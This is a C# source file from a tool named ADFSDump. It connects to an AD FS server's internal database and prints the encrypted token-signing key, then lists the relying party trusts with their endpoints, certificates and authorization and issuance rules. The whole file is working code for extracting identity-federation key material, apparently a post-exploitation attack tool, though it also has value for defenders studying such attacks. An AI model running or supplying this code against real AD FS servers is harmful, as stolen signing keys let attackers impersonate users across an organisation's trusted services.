using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;
using System.Xml;
using ADFSDump.RelyingPartyTrust;

namespace ADFSDump.ReadDB
{
    public static class DatabaseReader
    {
        private const string _WIDConnectionString = "Data Source=np:\\\\.\\pipe\\microsoft##wid\\tsql\\query;Integrated Security=True";
        private const string _WIDConnectionStringLegacy = "Data Source=np:\\\\.\\pipe\\MSSQL$MICROSOFT##SSEE\\sql\\query";
        private const string _ReadEncryptedPfxQuery = "SELECT ServiceSettingsData from {0}.IdentityServerPolicy.ServiceSettings";
        private static string[] _BuiltInScopes = { "SelfScope", "ProxyTrustProvisionRelyingParty", "Device Registration Service", "UserInfo", "PRTUpdateRp", "Windows Hello - Certificate Provisioning Service", "urn:AppProxy:com" };
        private const string _ReadScopePolicies = "SELECT SCOPES.ScopeId,SCOPES.Name,SCOPES.WSFederationPassiveEndpoint,SCOPES.Enabled,SCOPES.SignatureAlgorithm,SCOPES.EntityId,SCOPES.EncryptionCertificate,SCOPES.MustEncryptNameId, SAML.Binding, SAML.Location,POLICYTEMPLATE.name, POLICYTEMPLATE.PolicyMetadata, SCOPEIDS.IdentityData FROM {0}.IdentityServerPolicy.Scopes SCOPES LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeAssertionConsumerServices SAML ON SCOPES.ScopeId = SAML.ScopeId LEFT OUTER JOIN {0}.IdentityServerPolicy.PolicyTemplates POLICYTEMPLATE ON SCOPES.PolicyTemplateId = POLICYTEMPLATE.PolicyTemplateId LEFT OUTER JOIN {0}.IdentityServerPolicy.ScopeIdentities SCOPEIDS ON SCOPES.ScopeId = SCOPEIDS.ScopeId";
        private const string _ReadRules = "Select SCOPE.ScopeId, SCOPE.name, POLICIES.PolicyData,POLICIES.PolicyType, POLICIES.PolicyUsage FROM {0}.IdentityServerPolicy.Scopes SCOPE INNER JOIN {0}.IdentityServerPolicy.ScopePolicies SCOPEPOLICIES ON SCOPE.ScopeId = SCOPEPOLICIES.ScopeId INNER JOIN {0}.IdentityServerPolicy.Policies POLICIES ON SCOPEPOLICIES.PolicyId = POLICIES.PolicyId";
        private const string _ReadDatabases = "SELECT name FROM sys.databases";
        private const string _AdfsConfigTable = "AdfsConfiguration";


        static public Dictionary<string, RelyingParty>.ValueCollection ReadConfigurationDB()
        {
            SqlConnection conn = null;
            try
            {
                conn = new SqlConnection(_WIDConnectionString);
                conn.Open();
            } catch (SqlException e)
            {
                try
                {
                    conn = new SqlConnection(_WIDConnectionStringLegacy);
                    conn.Open();
                } catch(SqlException x)
                {
                    Console.WriteLine(string.Format("!!! Error connecting to WID. Are you sure AD FS is configured for WID?\n {0}", x));
                }
                
            } catch (Exception e)
            {
                Console.WriteLine(String.Format("!!! Error connecting to WID. Are you sure AD FS is configured for WID?\n {0}", e));
                System.Environment.Exit(1);
            }
            
            string adfsVersion = GetAdfsVersion(conn);
            if (string.IsNullOrEmpty(adfsVersion))
            {
                Console.WriteLine("!! Error identifying AD FS version");
                return null;
            }
            else
            {
                return ReadWID(adfsVersion, conn);
            }
            
        }

        static private string GetAdfsVersion(SqlConnection conn)
        {
            SqlDataReader reader = null;
            try
            {
                SqlCommand cmd = new SqlCommand(_ReadDatabases, conn);
                reader = cmd.ExecuteReader();
            } catch (Exception e)
            {
                Console.WriteLine(string.Format("!! Exception connecting to WID: {0}", e));
            }
            while (reader.Read())
            {
                string dbName = reader.GetString(0);
                if (dbName.Contains(_AdfsConfigTable))
                {
                    Console.WriteLine(string.Format("[-] Identified AD FS version: {0}\n", dbName));
                    reader.Close();
                    return dbName;
                }
            }
            return null;

        }

        static private Dictionary<string, RelyingParty>.ValueCollection ReadWID(string dbName, SqlConnection conn)
        {
            Dictionary<string, RelyingParty> rps = new Dictionary<string, RelyingParty>();

            SqlDataReader reader = null;
           
            try
            {
                string readEncryptedPfxQuery = string.Format(_ReadEncryptedPfxQuery, dbName);
                SqlCommand cmd = new SqlCommand(readEncryptedPfxQuery, conn);
                reader = cmd.ExecuteReader();

            } catch (Exception e)
            {
                Console.WriteLine("!!! Exception: {0}", e);
            }

            Console.WriteLine("## Reading Encrypted Signing Key from Database");
            while (reader.Read())
            {
                string xmlString = reader.GetString(0);

                XmlDocument xmlDocument = new XmlDocument();
                xmlDocument.LoadXml(xmlString);

                XmlElement root = xmlDocument.DocumentElement;

                XmlNode signingToken = root.GetElementsByTagName("SigningToken")[0];
                XmlNode encryptedPfx = root.GetElementsByTagName("EncryptedPfx")[0];
                Console.WriteLine("[-] Encrypted Token Signing Key Begin\r\n{0}\r\n[-] Encrypted Token Signing Key End\r\n", encryptedPfx.InnerText);

            }
            reader.Close();

            // enumerate scopes and policies
            try
            {
                string readScopePolicies = string.Format(_ReadScopePolicies, dbName);
                SqlCommand cmd = new SqlCommand(readScopePolicies, conn);
                reader = cmd.ExecuteReader();
            }
            catch (Exception e)
            {
                Console.WriteLine("!!! Exception: {0}", e);
            }

            Console.WriteLine("## Reading Relying Party Trust Information from Database");
            while (reader.Read())
            {
                string name = reader.GetString(1);
                if (!_BuiltInScopes.Any(name.Contains))
                {
                    string scopeId = reader.GetGuid(0).ToString();
                    RelyingParty rp = new RelyingParty { Name = name, Id = scopeId };
                    rp.IsEnabled = reader.GetBoolean(3);
                    rp.SignatureAlgorithm = reader.GetString(4);
                    rp.AccessPolicy = reader.GetString(11);
                    rp.Identity = reader.GetString(12);

                    if (!reader.IsDBNull(2))
                    {
                        rp.IsSaml = false;
                        rp.IsWsFed = true;
                        rp.FederationEndpoint = reader.GetString(2);
                    }
                    else
                    {
                        rp.IsSaml = true;
                        rp.IsWsFed = false;
                        rp.FederationEndpoint = reader.GetString(9);
                    }

                    if (!reader.IsDBNull(6))
                    {
                        rp.EncryptionCert = reader.GetString(6);
                    }

                    rps[scopeId] = rp;
                    
                }
            }
            reader.Close();

            try
            {
                string readRules = string.Format(_ReadRules, dbName);
                SqlCommand cmd = new SqlCommand(readRules, conn);
                reader = cmd.ExecuteReader();
            }
            catch( Exception e)
            {
                Console.WriteLine("!!! Exception: {0}", e);
            }

            while (reader.Read())
            {
                string scopeId = reader.GetGuid(0).ToString();
                string rule = reader.GetString(2);
                if (rps.Keys.Contains(scopeId) && !string.IsNullOrEmpty(rule))
                {

                    int ruleType = reader.GetInt32(4);
                    if (ruleType == 4) { rps[scopeId].StrongAuthRules = rule; }
                    else if (ruleType == 3) { rps[scopeId].OnBehalfAuthRules = rule; }
                    else if (ruleType == 2) { rps[scopeId].ActAsAuthRules = rule; }
                    else if (ruleType == 1) { rps[scopeId].AuthRules = rule; }
                    else { rps[scopeId].IssuanceRules = rule; }

                }


            }
            reader.Close();
            conn.Close();
            return rps.Values;
        }

    }
}
